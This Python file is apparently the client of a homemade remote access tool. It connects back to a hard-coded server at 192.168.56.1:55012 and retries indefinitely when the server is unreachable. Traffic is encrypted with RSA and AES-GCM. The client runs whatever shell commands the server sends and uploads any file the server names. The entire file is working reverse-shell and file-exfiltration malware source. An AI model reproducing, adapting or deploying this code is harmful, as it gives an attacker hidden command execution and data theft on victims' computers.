from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.PublicKey import RSA
from time import sleep
import subprocess
import platform
import binascii
import getpass
import socket
import random
import string
import os

###################COLORS#################
color_RED = '\033[91m'
color_GRE = '\033[92m'
color_YELL = '\033[93m'
color_BLU = '\033[94m'
color_PURP = '\033[35m'
color_reset = '\033[0m'
client = []
AES_Key_IV = [] # have to make it a list so that its accessible from all funcitons
RSA_public_key = ''
RSA_private_key = ''

######SERVER_VARS######
PORT = 55012
SERVER = '192.168.56.1'
ADDR = (SERVER, PORT)


def run_command(cmd2run):
    result = subprocess.run(cmd2run, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    if len(str(result.stderr)) < 5: # if there is no stderr command ran right
        if len(str(result.stdout)) < 5:
            return color_GRE + '[+] Command successfully executed.' + color_reset
        else:
            return result.stdout.decode()
    else:
        return result.stderr.decode()



def RSA_Keygen():
    keyPair = RSA.generate(4096)

    pubKey = keyPair.publickey()
    #print(f"Public key:  (n={hex(pubKey.n)}, e={hex(pubKey.e)})")
    pubKeyPEM = pubKey.exportKey()
    #print(pubKeyPEM.decode('ascii'))


    #print(f"Private key: (n={hex(pubKey.n)}, d={hex(keyPair.d)})")
    privKeyPEM = keyPair.exportKey()
    #print(privKeyPEM.decode('ascii'))

    public_key = pubKeyPEM.decode('ascii')
    private_key = privKeyPEM.decode('ascii')


    return public_key, private_key


def RSA_Encrypt(plaintext, publickey):

    pubKey = RSA.import_key(publickey).publickey()
    encryptor = PKCS1_OAEP.new(pubKey)
    ciphertext = encryptor.encrypt(plaintext.encode())
    return binascii.hexlify(ciphertext).decode()


def RSA_Decrypt(ciphertext, keydat):

    keyPair = RSA.import_key(keydat)

    decryptor = PKCS1_OAEP.new(keyPair)
    plaintext = decryptor.decrypt(binascii.unhexlify(ciphertext))

    return plaintext.decode()


def AES256_Encrypt(plaintext, keydat):

    secretKey = binascii.unhexlify(keydat.split(':')[0])
    iv = binascii.unhexlify(keydat.split(':')[1])

    aesCipher = AES.new(secretKey, AES.MODE_GCM, iv)
    ciphertext = aesCipher.encrypt(plaintext.encode())

    return binascii.hexlify(ciphertext).decode()

def AES256_Encrypt_bytes(plaintext, keydat):

    secretKey = binascii.unhexlify(keydat.split(':')[0])
    iv = binascii.unhexlify(keydat.split(':')[1])

    aesCipher = AES.new(secretKey, AES.MODE_GCM, iv)
    ciphertext = aesCipher.encrypt(plaintext)

    return binascii.hexlify(ciphertext).decode()

def AES256_Decrypt(ciphertext, keydat):
    # key and iv are seperated by a colon so we split on that
    secretKey = binascii.unhexlify(keydat.split(':')[0])
    iv = binascii.unhexlify(keydat.split(':')[1])

    aesCipher = AES.new(secretKey, AES.MODE_GCM, iv)
    plaintext = aesCipher.decrypt(binascii.unhexlify(ciphertext)).decode()
    return plaintext


def start_shell():
    failed_connections = 0
    while True:

        try:
            client[0].connect(ADDR)
            failed_connections = 0
        except Exception as e:
            print(str(e))
            if failed_connections > 20: # this is so that we dont ping out every 5 seconds if it doesnt respond for that long we wait an hour
                sleep(3600)
            else:
                sleep(5)
                failed_connections += 1
            continue
        print("Connected to server")
        break


def startup(): #TODO gotta find a way to make this try except statement work so if the shell disconnects within it we can get it back !!!!!only issue is if the connection dies while inside here the client is unable to connect anymore
    AES_Key_IV.clear() # this is so if the server crashes or closes our keys clear since its an array
    client.clear()
    client.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
    start_shell()
    try:
        RSA_public_key, RSA_private_key = RSA_Keygen()  # generate the RSA keys this takes a few seconds
        print('Authenticating to Server...')
        #print('sending client hello')
        client[0].sendall('Hello there'.encode()) # send a client hello
        #print('Getting the servers public key')
        server_public_key = client[0].recv(8192).decode() # get the servers public key
        #print('sending authentication')
        client[0].sendall(RSA_Encrypt('KEY GOES HERE', server_public_key).encode()) # send the psk required to access the server
        #print('recieving the welcome message')
        client[0].recv(64).decode() # this is the welcome message and is unneeded

        #print('RSA_key' + RSA_public_key)
        client[0].sendall(RSA_public_key.encode()) # send the public rsa key to the server
        encrypted_aes_key = client[0].recv(2048).decode()
        #print(encrypted_aes_key)
        AES_Key_IV.append(RSA_Decrypt(encrypted_aes_key, RSA_private_key))
        #print(AES_Key_IV)
        #print(AES256_Encrypt(str(platform.node()), AES_Key_IV[0]))
        client[0].sendall(AES256_Encrypt(str(platform.node()), AES_Key_IV[0]).encode()) # send out info encrypted by our new aes key given by the server
        print('Authentication Successful')
    except BaseException as e:
        print(e)
        sleep(3)
        startup()


def recieve(msg):
    msg = AES256_Decrypt(msg, AES_Key_IV[0])
    return msg


def send(msg):
    msg = AES256_Encrypt(msg, AES_Key_IV[0])
    client[0].sendall(msg.encode())

def send_bytes(msg):
    msg = AES256_Encrypt_bytes(msg, AES_Key_IV[0])
    client[0].sendall(msg.encode())


def big_send(msg):
    send(str(len(AES256_Encrypt(msg, AES_Key_IV[0])))) # send the length of the message
    recieve(client[0].recv(128).decode()) # server sends and ack to clear its buffer
    send(msg) # send the message


if __name__ == '__main__':
    startup()
    while True:
        command = ""
        try:
            command = recieve(client[0].recv(8192).decode())
            command = command[:len(command)-1] # this filters out the extra space we send at the end of a command
            print('\'{}\''.format(command))
            if command == 'whoamicust':
                send(str(getpass.getuser()) + '@' + str(platform.node()) + '# ')
            elif command == 'get':
                send(''.join(random.choices(string.ascii_uppercase, k=random.randrange(8, 15))))  # send an ack
                print('1')
                file_to_get = recieve(client[0].recv(8192).decode())
                print('11')
                try:
                    with open(file_to_get, 'rb') as f:
                        dat = f.read()
                        f.close()
                    print('1111')
                except FileNotFoundError:
                    print('111')
                    continue
                send(str(len(AES256_Encrypt_bytes(dat, AES_Key_IV[0]))))  # send the length of the message
                print('11111')
                recieve(client[0].recv(128).decode())  # server sends and ack to clear its buffer
                print('111111')
                send_bytes(dat)  # send the message
                print('1111111')
            else: # we run the command received
                big_send(run_command(command))

        except socket.error:
            startup()
        except BaseException as e:
            print(e)
            import traceback

            traceback.print_exc()
            continue
